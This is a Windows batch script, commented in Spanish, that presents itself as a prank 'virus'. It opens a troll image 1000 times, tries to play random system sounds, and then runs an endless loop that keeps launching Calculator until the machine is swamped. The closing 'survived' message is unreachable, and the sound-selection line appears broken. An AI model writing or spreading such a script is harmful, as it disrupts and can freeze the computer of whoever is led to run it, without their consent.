@echo off
setlocal enabledelayedexpansion

:: Ruta de la imagen
set "imagen=C:\troll.jpg"
set "veces=1000"

:: Verificar si la imagen existe
if not exist "%imagen%" (
    echo ERROR: La imagen no se encuentra en C:\troll.jpg
    pause
    exit
)

:: Agregar sonidos del sistema 
set "sonidos[0]=C:\Windows\Media\chimes.wav"
set "sonidos[1]=C:\Windows\Media\notify.wav"
set "sonidos[2]=C:\Windows\Media\tada.wav"
set "sonidos[3]=C:\Windows\Media\ding.wav"
set "sonidos[4]=C:\Windows\Media\button.wav"
:: Iniciar la calculadora en un proceso independiente (inmediatamente)
start "" C:\Windows\System32\calc.exe

:: Abrir la imagen 1000 veces
for /l %%i in (1,1,%veces%) do (
    start "" "%imagen%"
    ping 127.0.0.1 -n 1 -w 200 >nul

::reproducir un sonido aleatorio 
   :: Reproducir un sonido aleatorio
    set /a sonido_random=!random! %% 5
    start "" wmplayer "%sonidos[%sonido_random%]" >nul 2>&1
)

:: Bucle infinito para abrir la Calculadora (intentar con diferentes métodos)
:inicio
start "" ms-calculator:
ping 127.0.0.1 -n 1 >nul
goto inicio








echo Has sobrevivido al virus xddd.